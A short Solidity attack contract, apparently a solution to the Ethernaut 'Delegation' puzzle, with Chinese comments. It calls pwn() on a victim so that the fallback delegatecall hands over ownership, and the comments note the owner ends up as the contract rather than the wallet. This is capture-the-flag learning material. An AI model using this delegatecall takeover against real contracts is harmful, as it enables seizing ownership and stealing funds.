// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Delegation} from "./Delegation.sol";

contract Attacker {
    address victim;

    constructor(address _addr) {
        victim = _addr;
    }

    // 这个puzzle和HackSolidity中的UnsafeDelegatecall part1一样
    // Delegation中没有pwn(),所以会直接调用fallback中的delegatecall到Delegate
    // 为了能执行Delegate中的pwn(),所以要使用abi.encodeWithSignature("pwn()")
    function attack() public {
        victim.call(abi.encodeWithSignature("pwn()"));
    }

    // 一个问题: 正常来说执行了attack之后,Delegation中的owner会被修改成我们Attacker合约的地址
    // 但是在Ethernaut中却不算完成puzzle,应该owner需要是钱包中account的地址
}
